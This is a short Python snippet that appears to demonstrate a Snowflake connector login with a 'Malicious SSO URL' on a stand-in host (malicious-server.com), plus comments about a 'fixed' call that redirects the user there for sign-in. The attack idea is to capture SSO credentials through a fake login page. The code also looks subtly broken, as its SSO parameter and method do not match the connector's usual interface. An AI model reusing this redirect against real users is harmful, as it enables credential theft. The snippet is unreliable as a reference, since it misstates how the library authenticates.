import snowflake.connector

# Vulnerable code
conn = snowflake.connector.connect(
    user='username',
    password='password',
    account='account_name',
    warehouse='warehouse_name',
    database='database_name',
    schema='schema_name',
    sso_browser_auth=True
)

# Malicious SSO URL
sso_url = 'https://malicious-server.com/snowflake_sso'


# The original code attempted to call sso_browser_auth as a method on the class which is incorrect.
# The sso_browser_auth method needs to be called on the connection object.
# Redirect user to malicious SSO URL
# Note: you can't directly "redirect" using this, and this is NOT the intended way to use SSO
# This change only fixes the code to a correct call, not the usage itself.
conn.sso_browser_auth(sso_url)